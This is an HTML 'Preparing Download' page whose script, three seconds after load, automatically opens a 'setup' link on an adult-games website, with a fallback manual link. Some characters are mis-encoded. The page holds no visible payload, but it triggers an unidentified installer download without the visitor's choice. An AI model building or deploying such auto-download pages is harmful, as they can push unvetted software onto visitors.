<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Preparing Download</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #1f1c2c, #928dab, #0f2027, #203a43, #2c5364);
      background-size: 500% 500%;
      animation: gradientShift 20s ease infinite;
      color: #ffffff;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .info-card {
      backdrop-filter: blur(15px);
      background-color: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 16px;
      padding: 30px 25px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      text-align: center;
      width: 90%;
      max-width: 420px;
    }

    .info-icon {
      font-size: 48px;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 12px;
      letter-spacing: 0.5px;
    }

    #status-text {
      font-size: 16px;
      color: #dddddd;
    }

    .error-message {
      color: #ff5c5c;
      margin-top: 10px;
      font-size: 14px;
    }

    a.manual-link {
      color: #00e0ff;
      display: block;
      margin-top: 20px;
      font-size: 16px;
      text-decoration: none;
      transition: color 0.3s ease;
    }

    a.manual-link:hover {
      color: #ffffff;
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="info-card">
    <div class="info-icon">ðŸ“¦</div>
    <h1>Preparing your downloadâ€¦</h1>
    <p id="status-text">Please wait a momentâ€¦</p>
    <p id="error-text" class="error-message"></p>
    <a href="https://lewdgamespc.com/setup-ali/" class="manual-link" style="display:none;" id="manualLink">Click here if it doesn't start automatically</a>
  </div>

  <script>
    const downloadUrl = "https://lewdgamespc.com/setup-ali/";

    function startDownload() {
      try {
        const link = document.createElement("a");
        link.href = downloadUrl;
        link.target = "_blank";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        document.getElementById("status-text").innerText = "Your download should begin automatically.";
        document.getElementById("manualLink").style.display = "block";
      } catch (error) {
        document.getElementById("status-text").innerText = "";
        document.getElementById("error-text").innerText = "Download failed. Use the manual link below.";
        document.getElementById("manualLink").style.display = "block";
      }
    }

    window.onload = () => {
      setTimeout(startDownload, 3000); // 3-second delay
    };
  </script>

</body>
</html>
